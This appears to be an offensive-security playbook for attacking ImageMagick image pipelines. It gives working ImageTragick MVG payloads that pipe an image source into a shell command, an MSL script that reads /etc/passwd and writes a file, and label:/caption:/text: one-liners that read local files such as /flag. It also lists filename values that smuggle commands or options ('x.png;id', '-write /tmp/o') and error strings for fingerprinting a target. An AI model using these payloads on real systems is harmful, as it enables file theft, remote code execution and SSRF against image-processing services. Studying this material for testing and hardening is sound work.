# ImageMagick Deep — coders, delegates, and policy.xml

## The architecture — where the sink lives

```
convert x.png out.jpg →
  coder "png" parses → image object →
  delegate/external for some formats (gs, rsvg, inkscape, autotrace) →
  policy.xml gates coders/protocols →
  write via coder "jpg"
```

Every stage is attack surface. The sink is almost never `convert` itself —
it's a **coder** (mvg/msl/ps/pdf/svg/label/caption/text) or a **delegate**
(gs, rsvg-convert, inkscape, ffmpeg).

## `policy.xml` — the allowlist that decides what's reachable

```
/etc/ImageMagick-6/policy.xml or ImageMagick-7
<policy domain="coder" rights="none" pattern="MVG"/>
<policy domain="coder" rights="none" pattern="MSL"/>
<policy domain="coder" rights="none" pattern="PS|PS2|PS3|EPS|PDF|XPS"/>
<policy domain="delegate" rights="none" pattern="gs"/>
<policy domain="path" rights="none" pattern="@*"/>
<policy domain="resource" name="memory" value="256MiB"/>
```

Post-ImageTragick defaults ship MVG/MSL/PS/PDF disabled — a working setup
has `rights="none"` for these. The check: `convert -list policy` or the
policy.xml file itself (white-box), or send an MVG payload and read the
error (`not authorized`/`no decode delegate`).

## The MVG coder — the ImageTragick core

`identify`/convert on an `.mvg` or an image whose delegate resolves to MVG:

```mvg
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://x.tld/i.jpg|id'
pop graphic-context
```

Primitives that fetch/execute:

- `image over|copy|... 'url'` — `url()` fetch — SSRF
- `image ... 'label:@/etc/passwd'` — the `@` reads a local FILE into the
  label → file-read into the rendered output
- `image ... 'ephemeral:...'` — temp-file primitive
- `image ... 'msl:...'` — chain to MSL
- `text ... 'label:@/etc/passwd'` — text rendering with `@` read
- `image ... 'https://x|cmd'` — `|` pipe into a command

The `|` pipe inside an `image` source on old coders shells out — the RCE.

## MSL — the scripting coder

`.msl` files = `<image>` XML ops:

```xml
<image>
<read filename="/etc/passwd"/>
<write filename="/tmp/pwned.png"/>
</image>
```

`<read>`/`write`/`get`/`print`/`conceal` — the file-read primitive is
direct; `<exec>` historically shells out. MSL enabled → near-arbitrary
file read/write.

## Delegates — the external tools in the path

`delegates.xml` maps format→command. Reachable delegates:

- `gs` — PS/EPS/PDF/AI rendering → `image-attacks.md` gs section
- `rsvg-convert`/`inkscape` — SVG rendering — external process, XML parser
- `autotrace`/`potrace` — bitmap→vector
- `ffmpeg`/`mencoder` — video
- `unoconv`/`libreoffice` — office docs
- `xdg-open`/`www:`/`https:` URL delegates — `convert 'https://x' out` —
  fetch side

Filename→argv injection into a delegate — `convert "$f" out` where `$f`
is `x.png -write /tmp/o` or `x.png|id` — `filename-injection.md`.

## `label:`/`caption:`/`text:`/`info:` pseudo-coders

```
convert 'label:@/etc/passwd' out.png      → text-rendered file content
convert 'caption:@/flag' out.png          → same
convert 'text:@/flag' out.txt             → text read
convert 'info:@/flag' info.txt            → info-coder
convert 'x.png@/flag' ...                  → '@' indirection on filename
```

The `@` indirection reads a file as the "label"/"text" — a file-read
primitive wherever a label/caption/text/source field reaches it —
including inside MVG's `label:@/path`.

## SVG through ImageMagick — the coder chain

`convert x.svg` → tries `svg` coder (internal XML renderer, weak XXE
historically) → may delegate to `rsvg-convert`/`inkscape`/`msl`/MVG —
the payload inside the SVG hits whichever delegate is enabled.

## `identify`/`exiftool` — the read-only path that still parses

`identify x.png` runs the png coder — crashes/errors surface the coder
name + version-ish info. `exiftool x.jpg` is ExifTool — CVE-2021-22204
DjVu-eval — a different binary entirely.

## The `-write`/`+write` argv surface — filename-as-option

When a filename reaches `convert`-line argv unquoted:

```
x.png -write /tmp/o.png
x.png +delete
x.png -resize 1x1
x.png;id
x.png|id
```

Options after the filename are parsed as options — `-write` drops a file
anywhere. `identify`/`convert` don't need a shell for this — the FILENAME
itself is an option.

## Detecting the pipeline — what the error text leaks

```
"convert-im6.q16: unable to open image"          → IM6 present
"magick: no images defined"                      → IM7
"no decode delegate for this image format"       → coder disabled/missing
"not authorized" / "policy"                      → policy.xml gate fired
"sh: 1: gs: not found" / "gs exited"             → gs delegate reached
"rsvg-convert"                                   → rsvg delegate
```

## Falsifiers

- policy.xml disables MVG/MSL/PS/PDF/delegates AND filename never reaches
  argv
- no IM at all — pipeline is PIL/sharp/other

## Output to record

- the coder/delegate that fired + verbatim output/error
- which primitive landed (file-read, exec, write)
